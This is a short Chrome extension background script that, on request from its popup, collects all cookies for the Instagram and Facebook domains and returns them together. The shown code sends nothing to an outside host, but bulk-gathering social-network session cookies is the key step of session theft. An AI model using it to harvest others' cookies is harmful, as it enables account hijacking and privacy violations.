// background.js

// Function to get all cookies for a given domain
function getAllCookies(domain, callback) {
    chrome.cookies.getAll({ domain: domain }, function(cookies) {
        callback(cookies);
    });
}

// Listen for a message from the popup script to get cookies
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action === "getCookies") {
        var combinedCookies = {};

        // Function to handle cookies from each domain
        function handleCookies(domain, cookies) {
            combinedCookies[domain] = cookies;

            // Check if both Instagram and Facebook cookies have been collected
            if (Object.keys(combinedCookies).length === 2) {
                sendResponse({ status: "Cookies retrieved", cookies: combinedCookies });
            }
        }

        // Get cookies for Instagram
        getAllCookies(".instagram.com", function(cookies) {
            handleCookies(".instagram.com", cookies);
        });

        // Get cookies for Facebook
        getAllCookies(".facebook.com", function(cookies) {
            handleCookies(".facebook.com", cookies);
        });

        return true; 
    }
});
